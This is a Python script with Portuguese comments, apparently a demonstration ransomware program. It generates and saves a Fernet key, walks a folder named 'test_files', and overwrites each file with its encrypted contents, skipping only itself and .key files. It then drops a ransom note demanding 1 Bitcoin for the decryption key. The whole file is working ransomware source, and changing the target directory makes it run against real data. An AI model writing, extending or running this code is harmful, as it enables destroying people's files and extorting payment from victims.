from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia
def gerar_chave():
	chave = Fernet.generate_key()
	with open("chave.key","wb") as chave_file:
		chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
	return open("chave.key","rb").read()	

#3 Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
	f = Fernet(chave)
	with open(arquivo,"rb") as file:
		dados = file.read()
	dados_encriptados = f.encrypt(dados)
	with open(arquivo,"wb") as file:
		file.write(dados_encriptados)

#4 Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5 Mensagem de resgate
def criar_mensagem_resgate():
    with open("mensagem_resgate.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Para descriptografá-los, envie 1 Bitcoin para o endereço X e envie o comprovante.\n")
        file.write("Após o pagamento, você receberá a chave de descriptografia.\n")

# Execução principal
def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos_para_criptografar = encontrar_arquivos("test_files")
	for arquivo in arquivos_para_criptografar:
		criptografar_arquivo(arquivo, chave)
	criar_mensagem_resgate()
	print("Todos os arquivos foram criptografados!")
 
if __name__ == "__main__":
	main()